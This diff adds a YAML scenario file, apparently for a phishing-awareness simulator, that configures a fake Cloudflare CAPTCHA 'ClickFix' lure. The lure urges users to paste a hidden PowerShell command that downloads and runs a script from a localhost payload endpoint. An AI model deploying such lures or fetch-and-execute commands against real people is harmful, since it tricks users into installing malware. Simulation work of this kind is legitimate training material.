@@ -1,0 +1,24 @@
+# ============================================================
+# KỊCH BẢN 1: Cloudflare CAPTCHA Fake
+# Giả mạo trang xác minh Cloudflare Turnstile
+# Đây là kỹ thuật phổ biến nhất trong các chiến dịch ClickFix
+# ============================================================
+
+type: captcha
+template: lures/cloudflare_captcha.html
+route: /verify
+
+payload:
+  # JS tracker runs in browser; PS1 command is shown in the overlay for copy-paste
+  script: "default.js"
+
+content:
+  site_name: "portal.company-secure.net"
+  title: "Xác minh bạn là người thật"
+  instructions: "Hệ thống phát hiện hoạt động bất thường. Hoàn tất xác minh để tiếp tục truy cập."
+  # Lệnh được hiển thị trong overlay ClickFix và copy vào clipboard
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/awareness.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "cloudflare"
+  primary_color: "#F38020"
